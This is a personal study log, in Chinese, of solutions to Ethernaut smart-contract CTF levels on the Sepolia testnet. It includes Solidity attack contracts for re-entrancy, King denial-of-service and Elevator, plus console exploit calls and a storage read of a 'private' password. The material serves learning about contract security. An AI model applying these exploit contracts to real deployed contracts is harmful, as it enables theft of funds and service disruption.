---
timezone: Asia/Shanghai
---
---

# yulai

1. 自我介绍
程序员一枚，喜欢编码和区块链
2. 你认为你会完成本次残酷学习吗？
70%概率吧
## Notes

<!-- Content_START -->

### 2024.08.29
#### Ethernaut - Hello Ethernaut
1. eth sepolia rpc: https://eth-sepolia.public.blastapi.io
2. 现在测试网水龙头变得麻烦了，要求主网要有余额。
水龙头：https://sepolia-faucet.pk910.de/#/
3. 测试1部署合约：0x480Ee5663698aA065B3c971722eda3e835ce024d
4. 根据教程一步步执行，最后通过 authenticate 方法提交答案
#### Ethernaut - Fallback
合约地址：0x086Bb5B1F286D04cB7e8D228c736b377D6E1d4D3
调用方法时发送eth: await contract.contribute({value: '100'})
直接发送eth: await contract.send('100')
##### 解题思路
1. 调用 contribute 方法时发送eth
```
await contract.contribute({value: '100'})
```
2. 直接发送 eth
```
await contract.send('100')
```
3. 调用 withdraw 方法
```
await contract.withdraw()
```
#### Ethernaut - Fallout
##### 解题思路
构造器名称写错，导致构造器方法变成了普通方法，可以被调用
1. 调用 Fal1out 方法
```
await contract.Fal1out()
```
#### Ethernaut - Telephone
学习如何在 Remix 中部署合约和调用合约
合约地址：0xB09803A34a73B056D3B39e3a8bf577DB075E70eC



### 2024.08.30
#### Ethernaut - Telephone
在 Remix 上部署一个合约，调用 Telephone 合约的 changeOwner方法
1. 需要学习下如何在Remix上部署和调用合约

#### Ethernaut - Token
使用溢出攻击。需要让另一个账号来给我们转账。
合约transfer中 require 有问题，会受到溢出攻击。
合约地址：0x7e74e1b56aE3F378866a0A71921Aea1f4EAe0343
1. 可以使用 remix 编译这个合约，然后在remix部署页面通过 atAddress 可以定义到这个合约
2. 使用另一个账号给开发账号转账 1个币

### 2024.08.31
#### Ethernaut - Delegation
合约地址：0xd969Ee8f7634454a2Deb8dF8C28B0D113D536f48
1. 有些奇怪。在remix上编译这个合约，通过地址识别实例发现是Delegate合约，而不是Delegation合约。Deletegate合约可以直接执行 pwn 方法完成owner转换。
2. 猜测remix 无法准确识别两个合约在一个文件的情况，加上两个合约结构类似，因此可以正常调用

#### Ethernaut - Force
没有合约代码，有点不太懂
合约地址：0x00a5b5d5717192AE7e982Ec80ea006f188ee70E3
1. 这道题的目的是学习如何强制往一个空合约中转账，一般转账都要求目标合约有实现相关方法或者fallback, receive函数
2. 可以通过合约的 selfdestruct 方法实现强制转账
3. 还可以通过挖矿奖励或者在合约部署之前给它转账的方式，实现强制转账
4. 解题思路就是部署一个新合约，给它转点币，再调用它的自毁方法把币强制转给目标合约

### 2024.09.01
#### Ethernaut - Vault
合约地址：0x723d210fD10CB30e4C26e3E74C175d035B41383C </br>
学习如何访问合约中的 private 变量。可以通过 web3.js的方法查询
```
await web3.eth.getStorageAt(instance, 1)
```
获得值：0x412076657279207374726f6e67207365637265742070617373776f7264203a29 <br>
解析出来是：A very strong secret password :) <br>
值得一提的另一个解题方法是，直接反编译创建合约的字节码，也发现了： `'A very strong secret password :)'`，只是一开始以为是没用的注释，就没使用:)

#### Ethernaut - King
合约地址：0x7237a19220B624692cDC7b102204C36Cfc23B53e
本题学习如何构造一个不接收转账的合约。
1. 一开始正常往合约转了0.002eth，提交题目。发现被重置了king
2. 题目中会用到 king的transfer功能，因此可以构造一个合约来给目标合约转账，新合约会成为king。但是由于新合约无法接收转账，因此提交题目时不会出现1种的重置
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackKing {

    constructor(address king) payable {
        (bool success, ) = king.call{value: 0.002 ether}("");
        require(success, "call false");
    }

}
```

### 2024.09.02
#### Ethernaut - Re-entrancy
合约地址：0x84841B92767187f235B67690Db1179f7E6307faC
可以对 withdraw 使用重入攻击
需要特别注意，重入攻击不能放在 constructor 中。因为在创建合约时，fallback/receive函数内容可能还没有被初始化，会是空的
```
contract AttackReentracy {
    address payable public  _reentracy;
    address payable public _owner;

    constructor( address payable reentracy, address payable owner) public payable {
        _reentracy = reentracy;
        _owner = owner;
    }

    function withdraw() external payable {
        // 1. 往目标合约捐款
        Reentrance(_reentracy).donate{value: 0.001 ether}(address(this));
        // 2. 调用目标合约取款
        Reentrance(_reentracy).withdraw(1000000000000000);
        // 3. 给owner转账
        payable(_owner).transfer(address(this).balance);
    }

    fallback() external payable { 
        Reentrance(_reentracy).withdraw(1000000000000000);
    }

    receive() external payable {
        Reentrance(_reentracy).withdraw(1000000000000000);
    }
}
```
### 2024.09.03
#### Ethernaut - Elevator
合约地址：0x5cE212358a2D77fcd4cE431a33E5eDe2C3453C4d
题目要求构造一个合约，并且在一次交易的两次调用中，返回不同的值
```
contract BuildingImpl is Building {
    uint public top = 0;
    
    function isLastFloor(uint256) external returns (bool) {
        top++;
        return top == 2;
    }

    // 0x5cE212358a2D77fcd4cE431a33E5eDe2C3453C4d
    function attack(address elevator) external   {
        Elevator elevatorContract = Elevator(elevator);
        elevatorContract.goTo(1);
    }
}
```

<!-- Content_END -->